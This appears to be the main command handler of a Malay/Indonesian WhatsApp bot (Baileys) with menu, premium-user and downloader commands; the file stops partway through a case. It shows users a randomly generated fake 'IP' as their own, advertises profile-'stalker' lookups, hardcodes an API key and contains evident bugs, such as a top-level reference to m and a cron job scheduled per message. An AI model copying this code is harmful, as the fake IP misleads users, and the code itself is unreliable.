require('./all/settings')
require('dotenv').config();
require('./start.js')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
require("./all/global")
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, formatp,
  googleTTS, parseMention, getRandom, getGroupAdmins } = require('./all/myfunc')

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const path = require('path');
const os = require('os')
const flatted = require('flatted');
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const cron = require('node-cron');
const moment = require('moment-timezone')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./scrape/uploader')
const speed = require('performance-now')
const hx = require('hxz-api')
const fdl = require("caliph-api")
const { JSDOM } = require('jsdom')
const { exec } = require('child_process');
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const { color, bgcolor } = require('./all/color')
const { uptotelegra } = require('./all/upload')
const ytdl = require("ytdl-core")
const { dateDatabase } = require('./lib/functions.js')
const { msgFilter } = require('./lib/antispam')
const { premium } = require('./lib/premium')
const { toAudio, toPTT, toVideo, } = require('./lib/converter')
const { Client: WAWebClient, MessageType } = require('whatsapp-web.js');
const testimoni = JSON.parse(fs.readFileSync('./database/testimoni.json'))
const ntnsfw = JSON.parse(fs.readFileSync('./all/database/nsfw.json'))
const pengguna = JSON.parse(fs.readFileSync('./all/database/owner.json'))
const isUser = pengguna.includes(m.sender)
const apikey = process.env.apikey
const domainApi = process.env.domain

module.exports = async (kimzz, m, store) => {
  try {
    const from = m.key.remoteJid
    const quoted = m.quoted ? m.quoted : m
    const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
    const budy = (typeof m.text == 'string' ? m.text : '')
    const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
    const isCmd = body.startsWith(prefix)
    const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() // jika mau prefix ganti : const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' 
    const full_args = body.replace(command, '').slice(1).trim()
    const args = body.trim().split(/ +/).slice(1)
    const text = q = args.join(" ")
    const mime = (quoted.msg || quoted).mimetype || ''
    const qmsg = (quoted.msg || quoted)
    const isMedia = /image|video|sticker|audio/.test(mime)
    const isGroup = from.endsWith('@g.us')
    const botNumber = await kimzz.decodeJid(kimzz.user.id)
    const sender = m.key.fromMe ? (kimzz.user.id.split(':')[0] + '@s.whatsapp.net' || kimzz.user.id) : (m.key.participant || m.key.remoteJid)
    const senderNumber = sender.split('@')[0]
    const pushname = m.pushName || `${senderNumber}`
    const isBot = botNumber.includes(senderNumber)
    const groupMetadata = isGroup ? await kimzz.groupMetadata(m.chat).catch(e => { }) : ''
    const groupName = isGroup ? groupMetadata.subject : ''
    const participants = isGroup ? await groupMetadata.participants : ''
    const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
    const groupOwner = isGroup ? groupMetadata.owner : ''
    const groupMembers = isGroup ? groupMetadata.participants : ''
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
    const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
    const validGrup = (id, array) => {
      for (var i = 0; i < array.length; i++) { if (array[i] == id) { return !0 } }
      return !1
    }
    const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false
    const tanggal = moment.tz('Asia/Kuala_Lumpur').format('DD/MM/YY')
    const jam = moment.tz('asia/Kuala_Lumpur').format("HH:mm:ss");
    const hariini = moment.tz("Asia/Kuala_Lumpur").format("dddd, DD MMMM YYYY");
    const hari = moment.tz("Asia/Kuala_Lumpur").format("dddd");
    const ffstalk = require('./scrape/ffstalk')
    const scp1 = require('./scrape/scraper')
    const { Client } = require('ssh2');
    const dns = require('dns');
    const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./all/database/deposit");
    const jsobfus = require('javascript-obfuscator')
    const { mediafireDl } = require('./all/database/mediafire.js')
    let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));
    server = JSON.parse(fs.readFileSync('./database/server.json'))
    const grups = JSON.parse(fs.readFileSync('./database/grups.json'))
    const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
    const jangan = m.isGroup ? pler.includes(m.chat) : false
    const qtod = m.quoted ? "true" : "false"
    const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]

    // reply fitur
    const reply = (teks) => {
      kimzz.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            body: 'Powered By',
            thumbnailUrl: 'https://telegra.ph/file/1c05f9d73f7dd49f43eee.jpg',
            sourceUrl: "https://chat.whatsapp.com/JVHBR98nYe09E4z5OAOobr",
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      }, { quoted: m })
    }

    const newReply = (teks) => {
      kimzz.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            body: 'Powered By',
            thumbnailUrl: 'https://telegra.ph/file/1c05f9d73f7dd49f43eee.jpg',
            sourceUrl: "https://chat.whatsapp.com/JVHBR98nYe09E4z5OAOobr",
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      }, { quoted: m })
    }

    // Push Message To Console && Auto Read
    if (m.message) {
      kimzz.readMessages([m.key])
      console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
    }

    // Database
    const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
    const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
    const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

    // Cek Database
    const isContacts = contacts.includes(sender)
    const isPremium = prem.includes(sender)
    const isOwner = ownerNumber.includes(senderNumber) || isBot
    const isCreator = ownerNumber.includes(senderNumber) || isBot

    //=================================================

    function generateFakeIPAddress() {
      // Menghasilkan empat angka acak antara 0 dan 255
      const randomOctet = () => Math.floor(Math.random() * 256);

      // Menggabungkan empat oktet acak untuk membentuk alamat IP
      const fakeIPAddress = `${randomOctet()}.${randomOctet()}.${randomOctet()}.${randomOctet()}`;

      return fakeIPAddress;
    }

    try {
      let isNumber = x => typeof x === 'number' && !isNaN(x)
      let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
      let user = global.db.data.users[m.sender]
      let iduser = m.sender
      let premiumUser = isPremium ? 'Premium' : 'Free'
      const fakeIP = generateFakeIPAddress();
      if (typeof user !== 'object') global.db.data.users[m.sender] = {}
      if (user) {
        if (!isNumber(user.afkTime)) user.afkTime = -1
        if (!('afkReason' in user)) user.afkReason = ''
        if (!isNumber(user.limit)) user.limit = limitUser
      } else global.db.data.users[m.sender] = {
        afkTime: -1,
        afkReason: '',
        id: iduser,
        ip: fakeIP,
        limit: limitUser,
        user: premiumUser,
      }
      let chats = global.db.data.chats[m.chat]
      if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
      if (chats) {
        if (!('mute' in chats)) chats.mute = false
        if (!('antilink' in chats)) chats.antilink = false
        if (!('antilinkyt' in chats)) chats.antilinkyt = false
        if (!('antilinktt' in chats)) chats.antilinktt = false
        if (!('antivirtex' in chats)) chats.antivirtex = true
        if (!('antilinkv2' in chats)) chats.antilinkv2 = true
        if (!('antipanel' in chats)) chats.antipanel = false
      } else global.db.data.chats[m.chat] = {
        mute: false,
        antilink: false,
        antilinkyt: false,
        antilinktt: false,
        antivirtex: true,
        antilinkv2: true,
        antipanel: false
      }
      let setting = global.db.data.settings[botNumber]
      if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
      if (setting) {
        if (!isNumber(setting.status)) setting.status = 0
        if (!('autobio' in setting)) setting.autobio = false
        if (!('autoread' in setting)) setting.autoread = false
      } else global.db.data.settings[botNumber] = {
        status: 0,
        autobio: false,
        autoread: false
      }

    } catch (err) {
      console.error(err)
    }

    if (db.data.settings[botNumber].autobio) {
      let setting = global.db.data.settings[botNumber]
      if (new Date() * 1 - setting.status > 1000) {
        let _uptime = process.uptime() * 1000
        let uptime = clockString(_uptime)
        await kimzz.updateProfileStatus(`I am ${namabot} | Aktif Selama ${uptime}| Mode : ${kimzz.public ? 'Public-Mode' : 'Self-Mode'} | User : ${Object.keys(global.db.data.users).length}`).catch(_ => _)
        setting.status = new Date() * 1
      }
    }

    for (let jid of mentionUser) {
      let user = global.db.data.users[jid]
      if (!user) continue
      let afkTime = user.afkTime
      if (!afkTime || afkTime < 0) continue
      let reason = user.afkReason || ''
      newReply(`❗ Don't Tag Him!
💤 He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
⏳ During ${clockString(new Date - afkTime)}
`.trim())
    }

    if (db.data.users[m.sender].afkTime > -1) {
      let user = global.db.data.users[m.sender]
      newReply(`
🌤️ You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
⏳ During ${clockString(new Date - user.afkTime)}
`.trim())
      user.afkTime = -1
      user.afkReason = ''
    }

    // read database
    let tebaklagu = []
    let _family100 = []
    let kuismath = []
    let tebakkata = []
    let caklontong = []
    let caklontong_desk = []
    let tebakkalimat = []
    let tebaklirik = []
    let tebaktebakan = []
    let tebakgambar = db.data.game.tebakgambar
    let game = db.data.game;

    //=================================================

    // BanUser
    const banUser = await kimzz.fetchBlocklist

    // Auto Blocked Nomor +212
    if (m.sender.startsWith('212')) return kimzz.updateBlockStatus(m.sender, 'block')

    // Random Color
    const listcolor = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
    const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

    function delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Command Yang Muncul Di Console
    if (isCmd) {
      console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
    }

    async function loading() {
      var kimzzmod = [
        "ʟᴏᴀᴅɪɴɢ...",
        "_Hello My Name is SlrmyShop_",
        "_Base Script : KimzzDev_",
        "_Provider Api : Kimzz Api_",
        "_Website api : https://api.kimzzoffc.me/_",
        "_Web : https://resellermy.gov.biz.id/_",
      ]
      let { key } = await kimzz.sendMessage(from, { text: 'ʟᴏᴀᴅɪɴɢ...' })//Pengalih isu

      for (let i = 0; i < kimzzmod.length; i++) {
        await delay(10)
        await kimzz.sendMessage(from, { text: kimzzmod[i], edit: key });//PESAN LEPAS
      }
    }

    //total fitur
    const totalFitur = () => {
      var mytext = fs.readFileSync("./kimzz.js").toString()
      var numUpper = (mytext.match(/case '/g) || []).length;
      return numUpper
    }

    // Jangan Di Edit Tar Error
    let list = []
    for (let i of ownerNumber) {
      list.push({
        displayName: await kimzz.getName(i + '@s.whatsapp.net'),
        vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await kimzz.getName(i + '@s.whatsapp.net')}\n
FN:${await kimzz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
      })
    }

    function randomNomor(min, max = null) {
      if (max !== null) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
      } else {
        return Math.floor(Math.random() * min) + 1
      }
    }

    // Gak Usah Di Apa Apain Jika Tidak Mau Error
    try {
      ppuser = await kimzz.profilePictureUrl(m.sender, 'image')
    } catch (err) {
      ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
    }

    function getTotalMemoryUsage() {
      const used = process.memoryUsage();
      const format = (bytes) => (bytes / 1024 / 1024).toFixed(2);

      return {
        rss: format(used.rss),
        heapTotal: format(used.heapTotal),
        heapUsed: format(used.heapUsed),
        external: format(used.external),
      };
    }
    const memoryUsage = getTotalMemoryUsage();

    // speed
    function runSpeedTest() {
      const start = speed();

      // Operasi yang lebih kompleks (contoh: loop 10 juta kali)
      for (let i = 0; i < 10000000; i++) {
        // Tidak perlu melakukan apa pun di dalam loop ini, kita hanya membutuhkan waktu eksekusi yang lebih lama
      }

      const end = speed();
      const speedInSeconds = (end - start) / 1000;

      return speedInSeconds;
    }
    const speedTestResult = runSpeedTest();

    // Fake Resize
    const fkethmb = await reSize(ppuser, 300, 300)

    async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query,
            {
              compact: false,
              controlFlowFlattening: true,
              controlFlowFlatteningThreshold: 1,
              numbersToExpressions: true,
              simplify: true,
              stringArrayShuffle: true,
              splitStrings: true,
              stringArrayThreshold: 1
            }
          );
          const result = {
            status: 200,
            author: `𝗖𝗲𝗸𝗶𝗹-𝗠𝗱`,
            result: obfuscationResult.getObfuscatedCode()
          }
          resolve(result)
        } catch (e) {
          reject(e)
        }
      })
    }

// Fungsi untuk mereset limit semua pengguna
async function resetAllUserLimits() {
  const users = global.db.data.users;

  // Melakukan iterasi melalui semua entri pengguna dalam database
  for (const iduser in users) {
    const user = users[iduser];

    // Reset batas limit pengguna sesuai kebutuhan
    const isPremium = user.user === 'Premium';
    const limitUser = isPremium ? global.limitawal.premium : global.limitawal.free;
    user.limit = limitUser;
  }

  reply("Reset limits for all users done");
}

// Jadwal cron untuk mereset limit setiap jam 12 malam zona Asia/Kuala_Lumpur
cron.schedule(
  "0 0 * * *",
  () => {
    resetAllUserLimits();
  },
  {
    scheduled: true,
    timezone: "Asia/Kuala_Lumpur",
  }
);
   
    // buttons Tambahan
    const ownernomer = global.owner
    const ini_mark = `0@s.whatsapp.net`
    const ownernya = ownernomer + '@s.whatsapp.net'

    switch (command) {
      case 'menu': {
        await loading()
        let anu = `
╭╸〣 *ɪɴғᴏ - ᴜsᴇʀ*
│⌕ *ɴᴀᴍᴇ:* _${m.pushName}_
│⌕ *ɪᴘ:* _${db.data.users[m.sender].ip}_
│⌕ *sᴛᴀᴛᴜs:* _${isCreator ? "ᴏᴡɴᴇʀ" : "ᴜsᴇʀ"}_
│⌕ *ᴜsᴇʀ:* _${isPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}_
│⌕ *ʟɪᴍɪᴛ:* _${db.data.users[m.sender].limit}_
╰━━━━━━━━━━━━

╭╸〣 *ɪɴғᴏ - ᴛᴏᴅᴀʏ*
│⌕ *ᴅᴀʏ:* _${hari}_
│⌕ *ᴅᴀᴛᴇ:* _${tanggal}_
│⌕ *ᴛɪᴍᴇ:* _${jam}_
╰━━━━━━━━━━━━

╭╸〣 *ɪɴғᴏ - ʙᴏᴛ*
│⌕ *ᴏᴡɴᴇʀ:* _${global.owner}_
│⌕ *ᴘᴏᴡᴇʀᴇᴅ:* _api.kimzzoffc.me_
│⌕ *ʙᴀɪʟᴇʏs:* _ᴡʜɪsᴋᴇʏ/sᴏᴄᴋᴇᴛs_
│⌕ *ᴅᴀᴛᴀʙᴀsᴇ:* _ᴍᴏɴɢᴏᴅʙ_
╰━━━━━━━━━━━━

╭╸〣 *ɪɴғᴏ - sᴇʀᴠᴇʀ*
│⌕ *sᴘᴇᴇᴅ ᴛᴇsᴛ:* _${speedTestResult.toFixed(2)} sᴇᴄᴏɴᴅ_
│⌕ *ᴜᴘʟᴏᴀᴅ:* _${memoryUsage.heapTotal} ᴍʙ_
│⌕ *ᴅᴏᴡɴʟᴏᴀᴅ:* _${memoryUsage.heapUsed} ᴍʙ_
│⌕ *ʀᴀᴍ:* _${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_
╰━━━━━━━━━━━━

╭╸〣 *ɪɴғᴏ - ᴄᴍᴅ*
│⌕ *[ ${prefix} ]* = ᴘʀᴇғɪx
│⌕ *ⓟ* = ᴘʀᴇᴍɪᴜᴍ
│⌕ *Ⓞ* = ᴏᴡɴᴇʀ
│⌕ *Ⓔ* = ᴇʀʀᴏʀ
╰━━━━━━━━━━━━

╭╸〣 *ᴏᴡɴᴇʀ - ᴍᴇɴᴜ*
│⌕ ${prefix}ᴀᴅᴅᴘʀᴇᴍ Ⓞ
│⌕ ${prefix}ᴅᴇʟᴘʀᴇᴍ Ⓞ
│⌕ ${prefix}ʟɪsᴛᴜsᴇʀ Ⓞ
│⌕ ${prefix}ʟɪsᴛᴘʀᴇᴍ Ⓞ
╰━━━━━━━━━━━━

╭╸〣 *ᴜsᴇʀ - ᴍᴇɴᴜ*
│⌕ ${prefix}sᴛᴀᴛᴜs
│⌕ ${prefix}ʟɪᴍɪᴛ
╰━━━━━━━━━━━━

╭╸〣 *ᴅᴏᴡɴʟᴏᴀᴅ - ᴍᴇɴᴜ*
│⌕ ${prefix}ᴛɪᴋᴛᴏᴋᴍᴘ3
│⌕ ${prefix}ᴛɪᴋᴛᴏᴋᴍᴘ4
│⌕ ${prefix}ɪɢᴍᴘ4
│⌕ ${prefix}ɪɢɪᴍᴀɢᴇ
│⌕ ${prefix}ɪɢsᴛᴏʀʏ
│⌕ ${prefix}ɢɪᴛᴄʟᴏɴᴇ
│⌕ ${prefix}sᴘᴏᴛɪғʏᴅʟ ⓟ
│⌕ ${prefix}ғʙᴍᴘ4
│⌕ ${prefix}ғʙᴍᴘ3
│⌕ ${prefix}ᴛᴡɪᴛᴛᴇʀ
│⌕ ${prefix}ᴄᴏᴄᴏғᴜɴ
│⌕ ${prefix}ᴍᴇᴅɪᴀғɪʀᴇ
│⌕ ${prefix}ɢᴅʀɪᴠᴇ
│⌕ ${prefix}sғɪʟᴇ
╰━━━━━━━━━━━━

╭╸〣 *ᴏᴘᴇɴᴀɪ - ᴍᴇɴᴜ*
│⌕ ${prefix}ᴄʜᴀᴛɢᴘᴛ/ᴀɪ
│⌕ ${prefix}ᴀɪᴠᴏɪᴄᴇ 
│⌕ ${prefix}ᴅᴀʟʟᴇ ⓟ
╰━━━━━━━━━━━━

╭╸〣 *sᴇᴀʀᴄʜɪɴɢ - ᴍᴇɴᴜ*
│⌕ ${prefix}ssғɪʟᴇ
│⌕ ${prefix}ᴛʀᴀɴsʟᴀᴛᴇ/ᴛʀ
│⌕ ${prefix}ssᴘᴏᴛɪғʏ ⓟ
│⌕ ${prefix}ʏᴛs
│⌕ ${prefix}ɢɪᴍᴀɢᴇ
│⌕ ${prefix}ᴡɪᴋɪᴘᴇᴅɪᴀ
│⌕ ${prefix}ᴘɪɴᴛᴇʀᴇsᴛ
│⌕ ${prefix}ᴋʙʙɪ
╰━━━━━━━━━━━━

╭╸〣 *ᴛᴏᴏʟs - ᴍᴇɴᴜ*
│⌕ ${prefix}ɢᴇᴛ
│⌕ ${prefix}ᴛᴇᴍᴘᴍᴀɪʟ
│⌕ ${prefix}ɪɴʙᴏxᴍᴀɪʟ
│⌕ ${prefix}ᴄᴇᴋɪᴘ
│⌕ ${prefix}ᴛɪɴʏᴜʀʟ
│⌕ ${prefix}ᴄᴜᴛᴛʟʏ
│⌕ ${prefix}sʜᴏʀᴛᴇɴ
│⌕ ${prefix}sᴜʙғɪɴᴅᴇʀ
│⌕ ${prefix}ᴡʜᴏɪs
│⌕ ${prefix}ᴛᴛs
╰━━━━━━━━━━━━

╭╸〣 *ʀᴇʟɪɢɪᴏɴ - ᴍᴇɴᴜ*
│⌕ ${prefix}ǫᴜʀᴀɴᴍᴘ3
│⌕ ${prefix}ᴀsᴍᴀᴜʟʜᴜsɴᴀ
│⌕ ${prefix}ʜᴀᴅɪsᴛ
│⌕ ${prefix}ᴋɪsᴀʜɴᴀʙɪ
│⌕ ${prefix}sᴜʀᴀʜ
╰━━━━━━━━━━━━

╭╸〣 *sᴛᴀʟᴋᴇʀ - ᴍᴇɴᴜ*
│⌕ ${prefix}ɪɢsᴛᴀʟᴋ
│⌕ ${prefix}ᴛᴡɪᴛᴛᴇʀsᴛᴀʟᴋ
│⌕ ${prefix}ɢɪᴛʜᴜʙsᴛᴀʟᴋ
│⌕ ${prefix}ᴛᴛsᴛᴀʟᴋ
╰━━━━━━━━━━━━

╭╸〣 *ᴍᴀᴋᴇʀ - ᴍᴇɴᴜ*
│⌕ ${prefix}ʀᴇᴍᴏᴠᴇʙɢ ⓟ
│⌕ ${prefix}ʀᴇᴍɪɴɪ/ʜᴅ
│⌕ ${prefix}ᴛᴏᴢᴏᴍʙɪᴇ ⓟ
│⌕ ${prefix}ᴛᴏᴀɴɪᴍᴇ ⓟ
│⌕ ${prefix}ᴛᴛᴘ
│⌕ ${prefix}ᴛᴛᴘ2
│⌕ ${prefix}ᴛᴛᴘ3
╰━━━━━━━━━━━━

╭╸〣 *ʀᴀɴᴅᴏᴍ - ᴍᴇɴᴜ*
│⌕ ${prefix}ᴄᴇʀᴘᴇɴsᴀʜᴀʙᴀᴛ
│⌕ ${prefix}ᴄᴇʀᴘᴇɴʜᴏʀʀᴏʀ
│⌕ ${prefix}ᴄᴇʀᴘᴇɴʟᴜᴄᴜ
│⌕ ${prefix}ᴅᴀʀᴋᴊᴏᴋᴇs
│⌕ ${prefix}ᴅᴘᴄᴏᴜᴘʟᴇ
╰━━━━━━━━━━━━
`
        kimzz.sendMessage(m.chat, {
          text: anu,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              body: 'Powered By',
              thumbnailUrl: 'https://telegra.ph/file/1c05f9d73f7dd49f43eee.jpg',
              sourceUrl: "https://chat.whatsapp.com/JVHBR98nYe09E4z5OAOobr",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, { quoted: m })
        kimzz.sendMessage(from, { audio: { url: `./media/seram.mp3` }, mimetype: 'audio/mpeg', ptt: true })
      }
        // ========== owner menu ================
        break
      case 'addprem': {
        if (!isCreator) return newReply(mess.only.owner);

        if (!args[0]) return newReply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 60123456789`);

        let bnnd = q.split("|")[0].replace(/[^0-9]/g, '');
        let userId = `${bnnd}@s.whatsapp.net`;

        let ceknye = await kimzz.onWhatsApp(`${bnnd}@s.whatsapp.net`);

        if (ceknye.length === 0) return newReply(`Masukkan Nombor Yang Valid Dan Terdaftar Di WhatsApp!!!`);

        prem.push(userId);

        if (!db.data.users[userId]) {
          db.data.users[userId] = {};
        }

        db.data.users[userId].limit = global.limitawal.premium;
        db.data.users[userId].user = 'Premium';

        fs.writeFileSync('./database/database.json', JSON.stringify(global.db.data));
        fs.writeFileSync('./all/database/premium.json', JSON.stringify(prem));

        newReply(`Sekarang Nombor ${bnnd} Telah Premium!!!`);
      }
        break
      case 'delprem': {
        if (!isCreator) return newReply(mess.only.owner);
        if (!args[0]) return newReply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 60123456789`);

        let yaki = q.split("|")[0].replace(/[^0-9]/g, '');
        let nom = `${yaki}@s.whatsapp.net`;
        let unp = prem.indexOf(nom);

        prem.splice(unp, 1);

        if (!db.data.users[nom]) return reply(`Nombor ${yaki} tiada di dalam database`);

        db.data.users[nom].limit = global.limitawal.free;
        db.data.users[nom].user = 'Free';

        fs.writeFileSync('./database/database.json', JSON.stringify(global.db.data));
        fs.writeFileSync('./all/database/premium.json', JSON.stringify(prem));

        newReply(`Nombor ${yaki} Telah Di Hapus Dari Premium!!!`);
      }
        break
      case 'listuser': {
        if (!isCreator) return newReply(mess.only.owner);
        const userIds = Object.keys(db.data.users);
        let msg = '*List User From Database*\n\n'; // Variabel untuk mengumpulkan semua pesan
        userIds.forEach((userId, index) => {
          const userData = db.data.users[userId];
          msg += `${index + 1}. _${userData.id}_\nIp: _${userData.ip}_\nLimit: _${userData.limit}_\nUser: _${userData.user}_\n\n`;
        });
        reply(msg);
      }
      break
      case 'listprem': {
  if (!isCreator) return newReply(mess.only.owner);
  const userIds = Object.keys(db.data.users);
  let msg = '*List Premium Users*\n\n'; // Variabel untuk mengumpulkan semua pesan
  let premiumCount = 0; // Variabel untuk menghitung jumlah pengguna premium
  userIds.forEach((userId, index) => {
    const userData = db.data.users[userId];
    if (userData.user === 'Premium') {
      premiumCount++; // Menambahkan jumlah pengguna premium
      msg += `${premiumCount}. _${userData.id}_\nLimit: _${userData.limit}_\n\n`;
    }
  });
  if (premiumCount === 0) {
    msg += 'Tidak ada pengguna premium.';
  }
  reply(msg);
}
      break
      case 'status': {
       newReply(`Status Anda Adalah ${db.data.users[m.sender].user}\nLimit: ${db.data.users[m.sender].limit}`)
      }
        //=============== downloadmenu ==============
        break
      case 'tiktokmp4':
        if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.tiktok.com/@wilianugrah1/video/7288308401669410053?is_from_webapp=1`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        ini_link = args[0]
        try {
          get_result_tiktok = await fetchJson(`https://${domainApi}/api/download/tiktok?url=${ini_link}&model=v2&apikey=${apikey}`)
          get_result = get_result_tiktok.data.result
          kimzz.sendMessage(from, { video: { url: get_result.video }, caption: `${get_result.desc}` }, { quoted: m })
        } catch (error) {
          console.error(error)
          reply('gagal mendownload video dari URL ini')
        }
        break
      case 'git': case 'gitclone': {
        if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
        if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
        let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
        let [, user, repo] = args[0].match(regex1) || []
        repo = repo.replace(/.git$/, '')
        let url = `https://api.github.com/repos/${user}/${repo}/zipball`
        let filename = (await fetch(url, { method: 'HEAD' })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
        kimzz.sendMessage(m.chat, { document: { url: url }, fileName: filename + '.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
      }
        break
      case 'tiktokmp3':
        if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.tiktok.com/@wilianugrah1/video/7288308401669410053?is_from_webapp=1`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        ini_link = args[0]
        get_result = await fetchJson(`https://${domainApi}/api/download/tiktok?url=${ini_link}&model=v2&apikey=kimzzstore`)
        kimzz.sendMessage(from, { audio: { url: get_result.data.result.music }, mimetype: 'audio/mpeg' }, { quoted: m })
        break
      case 'ytmp3': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} https://youtu.be/5C8yvJUVB-0`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        ini_link = args[0]
        try {
          get_result = await fetchJson(`https://${domainApi}/api/download/ytmp3?url=${ini_link}&apikey=${apikey}`)
          get_result = get_result.result;
          var caption = `- Title : ${get_result.title}
- Views : ${get_result.views}
- Channel : ${get_result.channel}
- Upload At : ${get_result.published}

_Audio Sedang Di Hantar  ^.^_
_Silakan di tunggu selama 2 menit_`

          kimzz.sendMessage(from, { image: { url: get_result.thumb }, caption: caption }, { quoted: m });
          kimzz.sendMessage(m.chat, { audio: { url: `https://${domainApi}/api/download/y2mate?url=${ini_link}&apikey=${apikey}` }, mimetype: 'audio/mp4' }, { quoted: m })
        } catch (error) {
          console.error(error);
          newReply('Error while processing the request.');
        }
      }
        break
      case 'ytmp4': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} https://youtu.be/5C8yvJUVB-0`)
        if (global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
        db.data.users[m.sender].limit -= 1
        ini_link = args[0]
        get_result = await fetchJson(`https://${domainApi}/api/download/ytmp4?url=${ini_link}&apikey=kimzzstore`)
        var caption = `- Title : ${get_result.result.title}
- Views : ${get_result.result.views}
- Channel : ${get_result.result.channel}
- Upload At : ${get_result.result.published}

_Video Sedang Di Hantar  ^.^_
_Silakan di tunggu selama 2 menit_`

        kimzz.sendMessage(from, { image: { url: get_result.result.thumb }, caption: caption }, { quoted: m })
